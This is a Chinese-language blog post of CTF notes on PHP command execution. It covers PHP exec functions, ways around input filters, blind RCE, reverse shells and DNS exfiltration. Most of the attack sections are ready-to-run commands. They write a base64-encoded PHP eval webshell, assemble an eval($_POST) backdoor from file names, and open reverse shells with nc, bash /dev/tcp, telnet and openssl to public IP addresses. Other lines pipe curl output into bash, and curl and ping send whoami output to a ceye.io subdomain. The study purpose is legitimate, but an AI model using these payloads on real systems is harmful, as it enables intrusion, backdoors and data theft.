<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="mayylu">



    <meta name="description" content="学习是一种生活态度">



<title>php 命令执行 | mayylu&#39;s blog</title>



    <link rel="icon" href="/vue.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 5.4.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">mayylu&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">mayylu&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">php 命令执行</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">mayylu</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">八月 3, 2022&nbsp;&nbsp;</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>主要记录了一些在ctf中遇见的命令执行时的一些思路</p>
<span id="more"></span>

<h2 id="php命令执行相关函数"><a href="#php命令执行相关函数" class="headerlink" title="php命令执行相关函数"></a>php命令执行相关函数</h2><h3 id="php命令执行函数"><a href="#php命令执行函数" class="headerlink" title="php命令执行函数"></a>php命令执行函数</h3><p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220715211205.png" alt="QQ截图20220715211205"></p>
<p>实例</p>
<ol>
<li><p><strong>``</strong><br>里内容作为shell命令来执行,如echo `ls`;<br>底层为shell_exec</p>
</li>
<li><p>system()函数可以执行系统命令, 并将命令执行的结果直接输出到界面<br><code>system(&#39;ls&#39;)</code></p>
</li>
<li><p>exec()函数是被禁用的,先是 要关掉 安全模式 <code>safe_mode = off</code><br>exec(‘ls’,$result);如果result数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容<br><code>exec(&#39;ls&#39;,$result); print_r($result);</code></p>
</li>
<li><p>shell_exec()函数可以执行系统命令, 但它不会直接输出执行的结果, 而是返回一个字符串类型的变量来存储系统命令的执行结果<br><code>echo shell_exec(&#39;ls&#39;)</code></p>
</li>
<li><p>passthru()函数可以执行系统命令, 并将执行结果输出到页面中, 与system()函数不同的是, 它支持二进制的数据, 更多的用于文件, 图片等操作<br><code>passthru(&#39;ls&#39;)</code></p>
</li>
<li><p>popen()函数可以执行系统命令, 但不会输出执行的结果, 而是返回一个资源类型的变量用来存储系统命令的执行结果<br>$result = popen( ‘ls’ , ‘r’ );参数’1’:字符串类型,需要执行的命令,;参数2:字符串类型,模式 ;返回值:资源类型,命令执行的结果<br><code>$result = popen( &#39;ls&#39;,&#39;r&#39; ); echo fread( $result , 100 );</code></p>
</li>
</ol>
<h3 id="php命令执行绕过"><a href="#php命令执行绕过" class="headerlink" title="php命令执行绕过"></a>php命令执行绕过</h3><p>PHP内置的命令执行函数（如shell_exec、system），都只接受一个“字符串”作为参数。而在内核中，这个字符串将被直接作为一条shell命令来调用，这种情况下就极为容易出现命令注入漏洞。</p>
<p>由于这个特点，PHP特别准备了两个过滤函数：</p>
<pre><code>escapeshellcmd
escapeshellarg
</code></pre>
<p>二者分工不同.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</span><br><span class="line"></span><br><span class="line">功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/l4sij.png" alt="l4sij"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">escapeshellcmd — shell 元字符转义</span><br><span class="line"></span><br><span class="line">功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</span><br><span class="line"></span><br><span class="line">反斜线（\）会在以下字符之前插入： &amp;#;`|\?~&lt;&gt;^()[]&#123;&#125;$*, \x0A 和 \xFF*。 *’ 和 “ 仅在不配对儿的时候被转义。 </span><br><span class="line">在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果是先用 escapeshellarg 函数过滤,再用的 escapeshellcmd 函数过滤<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/se6sc.png" alt="se6sc"></p>
<h2 id="linux端执行"><a href="#linux端执行" class="headerlink" title="linux端执行"></a>linux端执行</h2><h3 id="命令执行中的各种绕过"><a href="#命令执行中的各种绕过" class="headerlink" title="命令执行中的各种绕过"></a>命令执行中的各种绕过</h3><p>在ctf中，命令执行一直是一个非常重要的考点，一道ctf题最后往往都需要我们执行命令来拿到flag，但一般都会有各种各样的过滤限制，接下来就来总结一下如何绕过这些过滤</p>
<h4 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;&gt;        <span class="comment">#重定向，如cat&lt;&gt;flag.php</span></span><br><span class="line">&#123;cat,flag&#125; <span class="comment">#花括号拓展</span></span><br><span class="line">%09      <span class="comment">#需要php环境，如cat%09flag.php</span></span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span>   <span class="comment">#单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个&#123;&#125;就固定了变量名，如cat$&#123;IFS2&#125;flag.php</span></span><br><span class="line">$IFS<span class="variable">$9</span>  <span class="comment">#后面加个$与&#123;&#125;类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php</span></span><br></pre></td></tr></table></figure>

<h4 id="绕过关键字"><a href="#绕过关键字" class="headerlink" title="绕过关键字"></a>绕过关键字</h4><ol>
<li>字符拆分绕过</li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls -&gt; l\s</span><br><span class="line">ls -&gt; l<span class="string">&quot;&quot;</span>s</span><br><span class="line">ls -&gt; l``s</span><br><span class="line">cat /flag -&gt; ca\t /flag -&gt; c\a\t /flag</span><br><span class="line">cat /flag -&gt; ca<span class="string">&quot;&quot;</span>t /flag -&gt; c<span class="string">&quot;&quot;</span>a<span class="string">&quot;&quot;</span>t /flag</span><br><span class="line">cat /flag -&gt; ca``t /flag -&gt; c``a``t /flag</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>拆分命令绕过</li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -&gt; a=l;b=s;$a<span class="variable">$b</span></span><br><span class="line">cat /flag -&gt; a=ag;b=fl;cat /$b<span class="variable">$a</span>;</span><br><span class="line">flag -&gt; a=faa;b=lage;<span class="variable">$&#123;a:0:1&#125;</span><span class="variable">$&#123;a:1:1&#125;</span><span class="variable">$&#123;b:1:1&#125;</span><span class="variable">$&#123;b:3:1&#125;</span>或者<span class="variable">$&#123;a:0:1&#125;</span><span class="variable">$&#123;b:0:3&#125;</span>  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>编码绕过</li>
</ol>
<ul>
<li><p>base64</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#base64编码并输出</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;cat&#x27;</span> | base64</span><br><span class="line"><span class="comment">#base64解码并输出</span></span><br><span class="line">`<span class="built_in">echo</span> Y2F0Cg== | base64 -d` /flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSkgPz4=|base64 -d&gt; shell.php</span><br><span class="line"><span class="comment">#注入后门,密码为cmd</span></span><br></pre></td></tr></table></figure></li>
<li><p>hex</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xxd用二进制或十六进制显示文件的内容</span><br><span class="line">-b参数： 以2进制字符串形式输出</span><br><span class="line">-ps参数：以连续16进制转储输出</span><br><span class="line">-r参数： 将16进制字符串表示转为实际的数</span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 77686F616D69 | xxd -r -p | bash </span><br><span class="line"><span class="comment">#其中77686F616D69是whoami的hex编码</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 636174202f666c6167 | xxd -r -p|bash </span><br><span class="line"><span class="comment">#其中636174202f666c6167是cat /flag的hex编码</span></span><br></pre></td></tr></table></figure>


<ol start="4">
<li>通配符绕过(与正则类似)</li>
</ol>
<p>在执行命令前，包含通配符的字符串将转换成匹配到的文件名，文件名按照字母顺序排列，以空格隔开</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*	              <span class="comment">#匹配任意长度字符</span></span><br><span class="line">？	            <span class="comment">#匹配任意一个字符</span></span><br><span class="line">[abcd]	        <span class="comment">#匹配abcd中的一个字符</span></span><br><span class="line">[a-z]	          <span class="comment">#匹配a-z中任意一个字符</span></span><br><span class="line">[!abcd]	        <span class="comment">#不匹配括号中的任意一个字符</span></span><br><span class="line">[^a-z]	        <span class="comment">#不匹配a-z中任意一个字符</span></span><br><span class="line">&#123;*.zip,a*.txt&#125;： <span class="comment">#&#123;&#125;表示一个集合，命令含义是列出所有以zip结尾的文件和所有a开头的txt文件</span></span><br></pre></td></tr></table></figure>
<p>linux下命令其实也是文件比如说像cat就对应文件/bin/cat，ls就对应文件/bin/ls等等，我们也可以用类似的方法进行构造：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -&gt;  /bin/l?</span><br><span class="line">cat -&gt; /bin/c??</span><br><span class="line"></span><br><span class="line"><span class="comment">#像preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)这种flag字样都是被过滤了的，我们用通配符就很好用：</span></span><br><span class="line">cat /flag -&gt; /bin/ca? /????</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>使用空变量绕过<br>变量说明:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$$    ——脚本运行的当前进程号（ProcessID）</span><br><span class="line">$!    ——后台运行的最后一个进程的ID</span><br><span class="line">$?    ——显示最后命令的退出状态。结果为0表示执行正常，结果为1表示执行异常；</span><br><span class="line">$#    ——参数个数</span><br><span class="line">$0    ——Shell本身的文件名,在命令行中使用为bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注：因为在没有传参的情况下，下面的特殊变量都是为空的</span><br><span class="line">$∗     ——所有参数列表。以&quot;$1 $2 … $n&quot;的形式输出所有参数。</span><br><span class="line">$@     ——所有参数列表。以&quot;$1&quot; “2&quot;…&quot;2&quot;…&quot;n” 的形式输出所有参数。</span><br><span class="line">$1～n  ——添加到Shell的各参数值。$1是第1参数、$2是第2参数…。</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h4><p>将命令写入文件并拼接，用sh执行文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1. 直接写入命令                     (13)</span></span><br><span class="line">root@kali:~<span class="comment"># echo &quot;ca\\&quot;&gt;cmd</span></span><br><span class="line">root@kali:~<span class="comment"># echo &quot;t\\&quot;&gt;&gt;cmd</span></span><br><span class="line">root@kali:~<span class="comment"># echo &quot; fl\\&quot;&gt;&gt;cmd</span></span><br><span class="line">root@kali:~<span class="comment"># echo &quot;ag&quot;&gt;&gt;cmd  </span></span><br><span class="line">root@kali:~<span class="comment"># cat cmd          </span></span><br><span class="line">ca\                             </span><br><span class="line">t\</span><br><span class="line"> fl\</span><br><span class="line">ag</span><br><span class="line">root@kali:~<span class="comment"># sh cmd</span></span><br><span class="line">this is your flag</span><br><span class="line"><span class="comment">#2. 利用文件名写入特殊命令</span></span><br><span class="line">root@kali:~/example<span class="comment"># &gt;ag					</span></span><br><span class="line">root@kali:~/example<span class="comment"># &gt;fl\\</span></span><br><span class="line">root@kali:~/example<span class="comment"># &gt;t\ \\</span></span><br><span class="line">root@kali:~/example<span class="comment"># &gt;ca\\</span></span><br><span class="line">root@kali:~/example<span class="comment"># ls -t</span></span><br><span class="line"><span class="string">&#x27;ca\&#x27;</span>  <span class="string">&#x27;t \&#x27;</span>  <span class="string">&#x27;fl\&#x27;</span>   ag   flag</span><br><span class="line">root@kali:~/example<span class="comment"># ls -t&gt;a       #(7)</span></span><br><span class="line">root@kali:~/example<span class="comment"># sh a  #sh会把a里面的每行内容当作命令来执行</span></span><br><span class="line">a: 1: a: not found</span><br><span class="line">this is your flag</span><br><span class="line">a: 6: flag: not found</span><br><span class="line"><span class="comment">#3. 临时文件执行</span></span><br><span class="line">url = <span class="string">&quot;http://a9320a52-4229-4dab-aa2b-9193c06c95e1.challenge.ctf.show/&quot;</span>​</span><br><span class="line">def getFlag():​</span><br><span class="line">  file=&#123;​</span><br><span class="line">  <span class="string">&quot;file&quot;</span>:<span class="string">&quot;#!/bin/sh\ncat /f*&gt;/var/www/html/1.txt&quot;</span>​</span><br><span class="line">  &#125;​</span><br><span class="line">​</span><br><span class="line">  data=&#123;​</span><br><span class="line">    <span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;. /t*/*&quot;</span>​                <span class="comment">#(7)</span></span><br><span class="line">  &#125;​</span><br><span class="line">  response = requests.post(url=url+<span class="string">&quot;api/tools.php&quot;</span>,files=file,data=data)​</span><br><span class="line">  </span><br><span class="line"><span class="comment">#4. 读取文件                         #(7)</span></span><br><span class="line">ls / &gt;a</span><br><span class="line">nl /*&gt;a</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------</span></span><br><span class="line">                                   <span class="comment"># (5)</span></span><br><span class="line"><span class="comment">#5. 使用dir和通配符写入命令</span></span><br><span class="line">root@kali:~/example<span class="comment"># &gt;dir</span></span><br><span class="line">root@kali:~/example<span class="comment"># &gt;f\&gt;</span></span><br><span class="line">root@kali:~/example<span class="comment"># &gt;ht-</span></span><br><span class="line">root@kali:~/example<span class="comment"># &gt;sl</span></span><br><span class="line">root@kali:~/example<span class="comment"># *&gt;v  #(等同于命令：dir &quot;f&gt;&quot; &quot;ht‐&quot; &quot;sl&quot; &gt; v )</span></span><br><span class="line">root@kali:~/example<span class="comment"># &gt;rev </span></span><br><span class="line">root@kali:~/example<span class="comment"># *v&gt;0 #前面的*v等同于命令rev v，相当于将v中的文件内容倒了回来，变回:ls -th &gt;f</span></span><br><span class="line">然后将倒转后的内容写入文件0中，文件0中的内容为:ls -th &gt;f</span><br><span class="line"><span class="comment">#4. 利用3命令注入php一句话木马</span></span><br><span class="line">&gt;dir</span><br><span class="line">&gt;0\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev </span><br><span class="line">*v&gt;a</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;w=\\</span><br><span class="line">&gt;pO\\</span><br><span class="line">&gt;V0\\</span><br><span class="line">&gt;bM\\</span><br><span class="line">&gt;1R\\</span><br><span class="line">&gt;PU\\</span><br><span class="line">&gt;1B\\</span><br><span class="line">&gt;kX\\</span><br><span class="line">&gt;Cg\\ </span><br><span class="line">&gt;hb\\</span><br><span class="line">&gt;XZ\\</span><br><span class="line">&gt;gZ\\</span><br><span class="line">&gt;HA\\</span><br><span class="line">&gt;a\\</span><br><span class="line">&gt;9w\\</span><br><span class="line">&gt;PD\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;o\\</span><br><span class="line">&gt;ch\\</span><br><span class="line">&gt;e\\</span><br><span class="line">sh a</span><br><span class="line">sh 0</span><br><span class="line"></span><br><span class="line"><span class="comment">#文件a中的内容为:ls -th &gt;0</span></span><br><span class="line"><span class="comment">#文件0中的内容为:</span></span><br><span class="line"><span class="built_in">echo</span><span class="variable">$&#123;IFS&#125;</span>PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==|base64 -d&gt;1.php</span><br><span class="line">0</span><br><span class="line">rev</span><br><span class="line">v</span><br><span class="line">sl</span><br><span class="line">ht‐</span><br><span class="line">f&gt;</span><br><span class="line">dir</span><br><span class="line"><span class="comment">#空格要用$&#123;IFS&#125;来代替，避免一句话中存在两个空格</span></span><br><span class="line"><span class="comment">#文件1.php成功生成后的内容为:&lt;?php eval($_POST[1]);</span></span><br></pre></td></tr></table></figure>


<h3 id="无回显rce"><a href="#无回显rce" class="headerlink" title="无回显rce"></a>无回显rce</h3><p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/d83dc72543847c322c70559f7b341f00.png" alt="d83dc72543847c322c70559f7b341f00"></p>
<h4 id="判断是否存在盲注"><a href="#判断是否存在盲注" class="headerlink" title="判断是否存在盲注"></a>判断是否存在盲注</h4><p>可以简单的通过<strong>sleep</strong>函数判断命令是否被执行<br>如 <code>sleep 5</code></p>
<h4 id="通过写文件来回显"><a href="#通过写文件来回显" class="headerlink" title="通过写文件来回显"></a>通过写文件来回显</h4><p><code>ls &gt; 1.txt</code><br>在当前目录创建文件,达到回显的效果，应注意执行是否有写的<strong>权限</strong></p>
<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>反弹shell需要拥有自己的公网ip</p>
<h5 id="NC-反弹shell"><a href="#NC-反弹shell" class="headerlink" title="NC 反弹shell"></a>NC 反弹shell</h5><ul>
<li><p>开放端口<br>检测是否开放端口<code>for i in &#123;440..449&#125;;do timeout 0.5 bash -c &quot;echo &gt;/dev/tcp/124.220.165.133/$i&quot; &amp;&amp; echo &quot;$i ************************open************************&quot; || echo &quot;$i closed&quot;;done</code><br>方式一：ufw（建议）<br>下载<code>sudo apt install ufw</code><br><code>sudo ufw status verbose</code>查看端口开放的情况<br><code>sudo ufw allow 9200</code> 允许外部访问9200端口(tcp/udp)</p>
</li>
<li><p>使用<br>接受端<code>nc -lvnp 2333</code><br>发送端使用<code>nc 124.220.165.133 2333 -e/bin/sh</code>或者直接反弹shell<code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/120.46.41.173/2333 0&gt;&amp;1&quot;</code><br>可能有延迟，需要多试几次</p>
<h5 id="其他反弹shell的命令"><a href="#其他反弹shell的命令" class="headerlink" title="其他反弹shell的命令"></a>其他反弹shell的命令</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 攻击机</span></span><br><span class="line">nc -lvvp 端口</span><br><span class="line"><span class="comment"># 目标机：</span></span><br><span class="line">rm -f a &amp;&amp; mknod a p &amp;&amp; telnet IP 端口 0&lt;a | /bin/bash 1&gt;a </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成秘钥(在我们攻击机上生成的)</span></span><br><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line"><span class="comment"># 在攻击机中启动监听(在之前生成秘钥的文件夹中执行)</span></span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 443</span><br><span class="line"><span class="comment"># 在目标机器上反弹shell</span></span><br><span class="line">mkfifo /tmp/s;/bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect IP:443 &gt; /tmp/s;rm /tmp/s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/43.128.11.131/4545&#x27;</span> &gt; index.html</span><br><span class="line"><span class="comment"># 这里&amp;是让这个命令后台执行</span></span><br><span class="line">python3 -m http.server &amp;</span><br><span class="line">nc -lvvp 4545 </span><br><span class="line"><span class="comment"># 目标机:</span></span><br><span class="line">curl 43.128.11.131:8000|bash</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="外带数据"><a href="#外带数据" class="headerlink" title="外带数据"></a>外带数据</h4><h5 id="dns外带"><a href="#dns外带" class="headerlink" title="dns外带"></a>dns外带</h5><p>注意：dns平台是外网请求延迟<strong>比较大</strong>，可能因程序报错而中断请求<br>平台url:  <a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io/</a><br>如果我们发起请求的目标不是IP地址而是域名的话，就一定会发生一次域名解析，那么假如我们有一个可控的二级域名，那么当它向下一层域名发起解析的时候，我们就能拿到它的域名解析请求。这就相当于配合dns请求完成对命令执行的判断，这就称之为dnslog。当然，发起一个dns请求需要通过linux中的ping命令或者curl命令<br>例如</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://cx7xrs.ceye.io/`whoami`</span><br><span class="line">ping `whoami`.cx7xrs.ceye.io</span><br></pre></td></tr></table></figure>
